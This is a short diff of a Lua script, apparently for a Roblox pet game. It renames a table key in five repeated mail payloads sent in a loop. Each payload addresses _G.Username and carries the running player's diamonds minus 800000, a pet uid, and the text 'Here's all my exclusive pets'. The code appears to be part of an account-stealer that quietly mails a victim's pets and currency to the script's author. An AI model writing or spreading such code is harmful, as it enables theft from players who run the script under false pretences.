@@ -376,7 +376,7 @@ while wait() do
     			[1] = {
         			["Light_Abood"] = _G.Username,
         			["999,999,999,999"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
-        			["Exclusive"] = {v.uid},
+        			["Pets"] = {v.uid},
         			["Here's all my exclusive pets"] = _G.GiftMessage
     			}
 			}
@@ -386,7 +386,7 @@ while wait() do
     			[1] = {
         			["Light_Abood"] = _G.Username,
         			["999,999,999,999"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
-        			["Exclusive"] = {v.uid},
+        			["Pets"] = {v.uid},
         			["Here's all my exclusive pets"] = _G.GiftMessage
     			}
 			}
@@ -396,7 +396,7 @@ while wait() do
     			[1] = {
         			["Light_Abood"] = _G.Username,
         			["999,999,999,999"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
-        			["Exclusive"] = {v.uid},
+        			["Pets"] = {v.uid},
         			["Here's all my exclusive pets"] = _G.GiftMessage
     			}
 			}
@@ -406,7 +406,7 @@ while wait() do
     			[1] = {
         			["Light_Abood"] = _G.Username,
         			["999,999,999,999"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
-        			["Exclusive"] = {v.uid},
+        			["Pets"] = {v.uid},
         			["Here's all my exclusive pets"] = _G.GiftMessage
     			}
 			}
@@ -416,7 +416,7 @@ while wait() do
     			[1] = {
         			["Light_Abood"] = _G.Username,
         			["999,999,999,999"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
-        			["Exclusive"] = {v.uid},
+        			["Pets"] = {v.uid},
         			["Here's all my exclusive pets"] = _G.GiftMessage
     			}
 			}
